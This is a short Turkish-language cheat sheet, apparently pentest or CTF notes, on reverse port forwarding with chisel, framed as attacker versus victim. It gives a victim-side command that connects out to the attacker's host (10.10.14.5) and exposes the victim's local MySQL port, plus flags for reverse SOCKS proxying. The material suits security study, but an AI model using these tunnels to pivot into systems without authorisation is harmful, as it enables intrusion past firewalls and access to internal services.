1) Reverse Port Forwarding (en yaygın kullanım)

Hedef makine dışarı çıkabiliyor ama sen içeri giremiyorsun (NAT/firewall arkasında).
Hedefteki bir servisi kendi makinene çekersin.

Senin makinende (attacker) — server:
```bash
chisel server -p 8080 --reverse
```

Hedef makinede (victim) — client:
```bash
./chisel client 10.10.14.5:8080 R:9000:127.0.0.1:3306
```
Sonuç: Hedefin `127.0.0.1:3306` (MySQL) portu, senin makinende `localhost:9000` olarak açılır.

R: = reverse anlamına gelir. 
## Format: 
```R:<local_port>:<hedef_ip>:<hedef_port>```


**Faydalı Bayraklar**

┌──────────────────┬──────────────────────────────────────────────────────────────────┐
│      Bayrak      │                             Açıklama                             │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ --reverse        │ Server'ın reverse tünellere izin vermesi (zorunlu, reverse için) │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ --socks5         │ SOCKS5 desteği                                                   │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ --auth user:pass │ Kimlik doğrulama (server ve client aynı olmalı)                  │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ --keepalive 25s  │ Bağlantıyı canlı tut (NAT timeout'a karşı)                       │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ -v               │ Verbose / debug logları                                          │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ --pid            │ PID dosyası yaz                                                  │
├──────────────────┼──────────────────────────────────────────────────────────────────┤
│ R:socks          │ Reverse SOCKS proxy                                              │
└──────────────────┴──────────────────────────────────────────────────────────────────┘
